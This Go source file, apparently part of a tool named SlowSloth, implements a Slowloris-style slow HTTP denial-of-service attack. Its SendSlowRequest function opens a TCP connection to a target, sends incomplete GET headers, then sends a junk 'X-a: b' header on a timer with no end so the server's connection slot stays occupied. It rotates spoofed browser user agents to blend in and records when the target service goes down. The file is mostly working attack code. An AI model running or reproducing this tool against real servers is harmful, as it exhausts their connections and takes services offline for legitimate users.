package slowrequest

import (
	"SlowSloth/pkg/statusprinter"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
	"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
	"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
	"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
	"Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
	"Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
	"Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
	// Add more user agents here
}

func getRandomUserAgent(r *rand.Rand) string {
	return userAgents[r.Intn(len(userAgents))]
}

type RequestStrategy interface {
	SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error
}

type GetRequestStrategy struct{}

func (s *GetRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error {
	userAgent := getRandomUserAgent(rand)
	requestHeaders := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", urlObj.RequestURI(), urlObj.Hostname(), userAgent)
	_, err := conn.Write([]byte(requestHeaders))
	// Additional header writes with delays...
	return err
}

type PostRequestStrategy struct {
	Body string
}

func (s *PostRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error {
	userAgent := getRandomUserAgent(rand)
	requestHeaders := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\n\r\n%s", urlObj.RequestURI(), urlObj.Hostname(), userAgent, len(s.Body), s.Body)
	_, err := conn.Write([]byte(requestHeaders))
	// Additional header writes with delays...
	return err
}

type RequestManager struct {
	strategy      RequestStrategy
	statusManager *statusprinter.StatusManager
	rand          *rand.Rand
}

func NewRequestManager(strategy RequestStrategy, statusManager *statusprinter.StatusManager) *RequestManager {
	src := rand.NewSource(time.Now().UnixNano())
	return &RequestManager{
		strategy:      strategy,
		statusManager: statusManager,
		rand:          rand.New(src),
	}
}

func (rm *RequestManager) SendSlowRequest(wg *sync.WaitGroup, urlObj *url.URL, delay time.Duration) {
	defer wg.Done()
	rm.statusManager.IncrementActiveConnections()
	defer rm.statusManager.DecrementActiveConnections()

	conn, err := net.Dial("tcp", urlObj.Host)
	if err != nil {
		rm.statusManager.SetServiceAvailable(false)
		return
	}
	defer conn.Close()

	// Send the initial part of the request (e.g., partial headers)
	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + urlObj.Hostname() + "\r\nUser-Agent: " + getRandomUserAgent(rm.rand) + "\r\n"))
	if err != nil {
		return
	}

	// Continuously send headers at intervals to keep the connection open
	ticker := time.NewTicker(delay)
	defer ticker.Stop()

	for range ticker.C {
		// Send a keep-alive part of the request
		_, err := conn.Write([]byte("X-a: b\r\n"))
		if err != nil {
			return
		}
	}
}
